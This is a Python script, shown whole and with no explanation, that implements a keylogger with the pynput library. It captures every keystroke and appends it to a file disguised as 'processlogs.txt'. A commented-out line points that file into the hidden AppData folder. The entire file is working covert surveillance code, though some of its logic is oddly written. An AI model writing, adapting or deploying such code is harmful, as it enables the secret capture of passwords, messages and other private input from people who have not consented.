from pynput.keyboard import Listener
import os

# path = os.environ(['appdata'] + '\\processlogs.txt')
path = 'processlogs.txt'

keystrokes = []
count = 0

def on_press(keys):

    global keystrokes, count

    keystrokes.append(keys)
    count += 1

    if count != 1:
        write_file(keystrokes)
        count = 0
        keystrokes = []

def write_file(key):
    with open(path, 'a') as file:
        for keys in key:
            k = str(keys).replace("'", "")
            if k.find("backspace") > 0:
                file.write(" Backspace ")
            elif k.find("shift") > 0:
                file.write(" Shift ")
            elif k.find("enter") > 0:
                file.write("\n")
            elif k.find("space") > 0:
                file.write(" ")
            elif k.find("caps_lock") > 0:
                file.write(" caps_lock ")
            elif k.find("tab") > 0:
                file.write(" tab ")
            elif k.find("Keys"):
                file.write(k)


with Listener(on_press=on_press) as listener:
    listener.join()
